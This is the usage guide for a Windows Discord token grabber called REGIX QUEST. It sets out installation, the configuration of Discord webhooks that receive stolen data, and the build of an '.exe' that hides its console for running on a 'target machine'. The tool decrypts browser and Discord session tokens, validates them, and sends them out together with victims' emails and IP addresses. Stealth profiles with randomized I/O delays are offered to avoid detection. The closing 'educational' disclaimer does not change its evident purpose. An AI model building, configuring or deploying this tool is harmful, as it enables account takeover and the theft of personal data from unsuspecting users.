<p align="center">
  <h1 align="center">📖 REGIX QUEST — Complete Guide</h1>
  <p align="center"><em>Step-by-step setup, configuration, usage, building, and troubleshooting</em></p>
</p>

---

## Table of Contents

1. [Prerequisites](#-prerequisites)
2. [Installation](#-installation)
3. [Configuration](#-configuration)
4. [Usage](#-usage)
5. [Building Executables](#-building-executables)
6. [Configuration Profiles](#-configuration-profiles)
7. [Troubleshooting](#-troubleshooting)
8. [Quick Reference](#-quick-reference)

---

## 📋 Prerequisites

| Requirement | Minimum    | Notes                                                                                          |
| :---------- | :--------- | :--------------------------------------------------------------------------------------------- |
| **Python**  | 3.7+       | [python.org/downloads](https://www.python.org/downloads/) — check "Add to PATH" during install |
| **OS**      | Windows 7+ | Required for `win32crypt` (DPAPI)                                                              |
| **Disk**    | ~50 MB     | For dependencies + built executable                                                            |

Verify Python:

```bash
python --version
# Expected: Python 3.7.0 or higher
```

---

## 🔧 Installation

Choose one method:

### Method A — Automated _(recommended)_

```bash
python setup.py
```

This auto-detects missing packages and installs them silently. Handles `pypiwin32`, `pycryptodome`, and all other dependencies.

### Method B — Interactive Menu

```
1. Double-click  build.bat
2. Select option  [1] Install Dependencies
3. Wait for completion
```

### Method C — Manual

```bash
pip install pypiwin32 pycryptodome pyinstaller Pillow
```

### Verify Installation

```bash
python -c "import win32crypt; import Crypto.Cipher.AES; print('All dependencies OK')"
```

---

## ⚙️ Configuration

All runtime behavior is controlled by **`config.json`** in the project root.

### Minimal Setup

The only **required** field is `webhook_urls`:

```json
{
  "webhook_urls": ["https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"]
}
```

### How to Create a Discord Webhook

1. Open your Discord server → **Settings** → **Integrations** → **Webhooks**
2. Click **New Webhook**
3. Name it (e.g., `REGIX QUEST`), select the target channel
4. Click **Copy Webhook URL**
5. Paste into `config.json`

### Full Configuration Breakdown

---

#### `webhook_urls` — _Required_

```json
"webhook_urls": [
    "https://discord.com/api/webhooks/PRIMARY",
    "https://discord.com/api/webhooks/BACKUP"
]
```

- **Type:** Array of strings
- **Behavior:** Sends to the first URL. On failure, retries (see `webhook_retry_count`), then cascades to the next URL in the list.
- **Best practice:** Use 2–3 webhooks on different servers for maximum reliability.

---

#### `avatar_url` — _Optional_

```json
"avatar_url": "https://i.imgur.com/HmoE29J.png"
```

- Sets the avatar image displayed on webhook messages.
- Must be a **direct image URL** (not an imgur page URL).

---

#### `embed_color` — _Optional_

```json
"embed_color": 1752220
```

- Discord embed sidebar color in **decimal** format.
- Convert from hex: `0x1ABC9C` → `1752220`
- [Color picker tool](https://www.google.com/search?q=color+picker)

---

#### `timeout` — _Optional_

```json
"timeout": 10
```

- HTTP request timeout in seconds for API calls and webhook delivery.
- **Recommended:** `10` for normal use, `5` for speed, `15` for slow connections.

---

#### `dry_run` — _Optional_

```json
"dry_run": false
```

- When `true`: scans all targets, validates tokens, logs what **would** be sent — but sends **nothing** to webhooks.
- **Use for:** Testing configuration, debugging, verifying setup.

---

#### `silent_mode` — _Optional_

```json
"silent_mode": false
```

- When `true`: suppresses all `INFO` and `WARNING` log output. Only `ERROR` and `CRITICAL` messages are shown.
- **Use for:** Background/covert operation.

---

#### `save_to_file` / `backup_file` — _Optional_

```json
"save_to_file": true,
"backup_file": "regix_quest_backup.txt"
```

- Saves all validated tokens to a local plaintext file with timestamps, usernames, emails, and IPs.
- Acts as a safety net if webhook delivery fails.

**Output format:**

```
[2026-02-15 02:30:00] Chrome (Default)
Token: NzM5...
User: ExampleUser#1234
Email: user@example.com
IP: 203.0.113.42
--------------------------------------------------------------------------------
```

---

#### `max_threads` — _Optional_

```json
"max_threads": 20
```

- Controls `ThreadPoolExecutor` worker count for **parallel token validation**.
- Each found token is validated against Discord's API concurrently.
- **Recommended:** `10–20` for normal use, `50` for maximum speed.

---

#### `random_delays` / `min_delay` / `max_delay` — _Optional_

```json
"random_delays": true,
"min_delay": 0.01,
"max_delay": 0.05
```

- Inserts a random delay (in seconds) between each file read during scanning.
- Reduces detectable I/O patterns.
- **Disable for speed**, enable for stealth.

---

#### `webhook_retry_count` / `webhook_retry_delay` — _Optional_

```json
"webhook_retry_count": 3,
"webhook_retry_delay": 2.0
```

- On webhook failure, retries up to `webhook_retry_count` times with `webhook_retry_delay` seconds between attempts.
- After exhausting retries, moves to the next URL in `webhook_urls`.

---

#### `exe_icon` — _Optional_

```json
"exe_icon": "https://imgur.com/HmoE29J"
```

- Sets a custom icon for the built `.exe` file.
- Accepts:
  - **Imgur page URLs** — auto-converted to direct image links
  - **Direct image URLs** (`.png`, `.jpg`, etc.) — downloaded and converted to `.ico`
  - **Local `.ico` file paths** — used as-is
- Requires `Pillow` (auto-installed by builder).

---

### Validate Your Config

```bash
python regix_quest.py --dry-run
```

**Expected output:**

```
INFO:Loaded configuration from config.json
INFO:Configuration validation passed
INFO:Starting REGIX QUEST Token Grabber - Professional Edition
INFO:[DRY RUN MODE] No data will be sent to webhooks
```

If you see `Configuration validation passed` — you're good.

---

## 🎮 Usage

### Option 1 · Interactive Menu

Double-click **`build.bat`**:

```
================================================
   REGIX QUEST Token Grabber - Professional Edition
================================================

[1] Install Dependencies
[2] Run REGIX QUEST (Normal Mode)
[3] Run REGIX QUEST (Dry Run Mode)
[4] Run REGIX QUEST (Silent Mode)
[5] Build Executable (PyInstaller)
[6] Build Executable (Stealth Mode)
[7] Test Configuration
[8] Clean Build Files
[9] Exit
```

### Option 2 · Quick Launch

Double-click **`run.bat`** — runs `python regix_quest.py` immediately.

### Option 3 · Command Line

```bash
# Standard execution
python regix_quest.py

# Custom config file
python regix_quest.py --config production.json

# Dry run — test without sending
python regix_quest.py --dry-run

# Silent — minimal console output
python regix_quest.py --silent

# Combined
python regix_quest.py --silent --config stealth.json

# Help
python regix_quest.py --help
```

### What Happens During Execution

1. **Config loaded** → `config.json` values merged with defaults
2. **Config validated** → webhook URLs, environment variables checked
3. **Public IP resolved** → via `api.ipify.org`
4. **Platforms scanned** → one thread per browser/client, in parallel
5. **Tokens deduplicated** → `set()`-based O(1) filtering
6. **Tokens validated** → parallel HTTP calls to `discord.com/api/v9/users/@me`
7. **Results delivered** → webhook embed + local backup file

---

## 📦 Building Executables

### Why Build?

- No Python installation required on target machine
- Single portable `.exe` file
- `config.json` is embedded inside the binary
- Stealth mode hides the console window

### Build Methods

#### Interactive

```
build.bat → [5] Build Executable (PyInstaller)       # With console
build.bat → [6] Build Executable (Stealth Mode)       # No console window
```

#### CLI

```bash
python builder.py              # Standard build → dist/RegixQuest.exe
python builder.py --stealth    # Stealth build  → dist/RegixQuest_Stealth.exe
```

#### Manual (without builder.py)

```bash
pip install pyinstaller
pyinstaller --onefile --name RegixQuest --add-data "config.json;." --hidden-import win32crypt --hidden-import Crypto.Cipher.AES regix_quest.py
```

Add `--noconsole` for stealth.

### Custom Icon

Set `exe_icon` in `config.json` before building:

```json
"exe_icon": "https://imgur.com/HmoE29J"
```

The builder will:

1. Detect the imgur page URL → convert to `https://i.imgur.com/HmoE29J.png`
2. Download the image
3. Convert to multi-size `.ico` (16×16 through 256×256)
4. Pass to PyInstaller as `--icon=icon.ico`
5. Clean up temporary files after build

### Build Output

```
dist/
├── RegixQuest.exe           # Standard build
└── RegixQuest_Stealth.exe   # Stealth build (no console)
```

Build time: ~30–60 seconds depending on disk speed.

---

## 🎯 Configuration Profiles

### ⚡ Maximum Speed

```json
{
  "max_threads": 50,
  "timeout": 5,
  "random_delays": false,
  "webhook_retry_count": 1,
  "webhook_retry_delay": 0.5
}
```

**Trade-off:** Fastest possible execution. No stealth. Minimal retry tolerance.

### 🥷 Maximum Stealth

```json
{
  "max_threads": 5,
  "timeout": 15,
  "random_delays": true,
  "min_delay": 0.05,
  "max_delay": 0.2,
  "silent_mode": true
}
```

**Trade-off:** Slower execution. Randomized I/O patterns. No console output.

### 🛡️ Maximum Reliability

```json
{
  "webhook_urls": [
    "https://discord.com/api/webhooks/PRIMARY",
    "https://discord.com/api/webhooks/BACKUP_1",
    "https://discord.com/api/webhooks/BACKUP_2"
  ],
  "save_to_file": true,
  "webhook_retry_count": 5,
  "webhook_retry_delay": 3.0,
  "timeout": 20
}
```

**Trade-off:** Multiple fallback webhooks + local backup. Slower but near-guaranteed delivery.

---

## 🔧 Troubleshooting

### `"No webhook URLs configured and not in dry-run mode"`

**Cause:** `webhook_urls` is empty or contains only `""`.

**Fix:**

```json
"webhook_urls": ["https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"]
```

---

### `ModuleNotFoundError: No module named 'win32crypt'`

**Cause:** Missing `pypiwin32` dependency.

**Fix:**

```bash
python setup.py
# or manually:
pip install pypiwin32
```

---

### `ModuleNotFoundError: No module named 'Crypto'`

**Cause:** Missing `pycryptodome` dependency.

**Fix:**

```bash
pip install pycryptodome
```

> **Note:** If you have `pycrypto` installed, it conflicts. Uninstall it first: `pip uninstall pycrypto`

---

### Webhook sends but no message appears in Discord

**Possible causes & fixes:**

| Cause                | Fix                                  |
| :------------------- | :----------------------------------- |
| Webhook URL is wrong | Re-copy from Discord server settings |
| Webhook was deleted  | Create a new webhook                 |
| Rate limited         | Wait 1–2 minutes, try again          |
| Channel permissions  | Ensure webhook has send permissions  |

Test your webhook directly:

```bash
python regix_quest.py --dry-run
```

This shows the exact payload that would be sent.

---

### `"No tokens found on this machine"`

This is **normal** when:

- No Discord sessions exist on the machine
- The user isn't logged into Discord or any supported browser
- Testing on a clean/fresh system

**To verify the tool works:**

1. Log into Discord in a Chromium browser
2. Run `python regix_quest.py --dry-run`
3. Check the output for token discovery logs

---

### EXE icon not showing

**Cause:** The `exe_icon` URL points to an imgur page (`imgur.com/ID`) instead of a direct image.

**Fix (automatic):** The builder now auto-converts imgur page URLs. Just rebuild:

```bash
python builder.py
```

**Fix (manual):** Use a direct image URL:

```json
"exe_icon": "https://i.imgur.com/HmoE29J.png"
```

---

### Build fails with PyInstaller

**Common fixes:**

```bash
# Reinstall PyInstaller
pip uninstall pyinstaller -y
pip install pyinstaller

# Ensure no spaces in project path
# ✅ Good: C:\REGIX QUEST\
# ❌ Bad:  C:\My Projects\REGIX QUEST Main\

# Clean stale build artifacts first
build.bat → [8] Clean Build Files
```

---

### Slow performance

**Tune these settings in `config.json`:**

```json
{
  "max_threads": 50,
  "random_delays": false,
  "timeout": 5
}
```

See [Configuration Profiles](#-configuration-profiles) for optimized presets.

---

## 📋 Quick Reference

### Commands

| Command                               | Description                     |
| :------------------------------------ | :------------------------------ |
| `python setup.py`                     | Install all dependencies        |
| `python regix_quest.py`                    | Run with default config         |
| `python regix_quest.py --dry-run`          | Test mode — no webhook delivery |
| `python regix_quest.py --silent`           | Suppress console output         |
| `python regix_quest.py --config file.json` | Use alternate config            |
| `python builder.py`                   | Build standard `.exe`           |
| `python builder.py --stealth`         | Build no-console `.exe`         |

### Files

| File                      | Purpose                           |
| :------------------------ | :-------------------------------- |
| `config.json`             | Runtime configuration             |
| `regix_quest_backup.txt`       | Local token backup (auto-created) |
| `dist/RegixQuest.exe`         | Built executable                  |
| `dist/RegixQuest_Stealth.exe` | Built stealth executable          |
| `build.bat`               | Interactive menu                  |
| `run.bat`                 | Quick launcher                    |

### Build Menu

| Option | Action                |
| :----- | :-------------------- |
| `[1]`  | Install dependencies  |
| `[2]`  | Run normal mode       |
| `[3]`  | Run dry-run mode      |
| `[4]`  | Run silent mode       |
| `[5]`  | Build standard exe    |
| `[6]`  | Build stealth exe     |
| `[7]`  | Test configuration    |
| `[8]`  | Clean build artifacts |
| `[9]`  | Exit                  |

---

<p align="center">
  <strong>💀 REGIX QUEST — Built by REGIX QUEST</strong><br>
  <sub>For educational and authorized security research only.</sub>
</p>
